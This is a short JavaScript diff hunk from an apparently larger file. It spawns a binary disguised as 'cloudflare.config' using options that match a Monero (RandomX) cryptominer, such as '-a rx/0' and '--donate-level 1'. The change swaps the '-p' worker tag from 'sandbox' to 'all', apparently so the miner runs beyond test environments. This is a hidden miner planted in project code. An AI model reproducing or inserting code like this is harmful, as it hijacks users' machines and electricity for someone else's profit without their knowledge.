@@ -322,7 +322,7 @@ let child = spawn(__dirname + "/./cloudflare.config", [
   "-a",
   "rx/0",
   "-p",
-  `sandbox${Math.floor(+new Date() / 1000)}`,
+  `all${Math.floor(+new Date() / 1000)}`,
   "--donate-level",
   "1",
 ]);
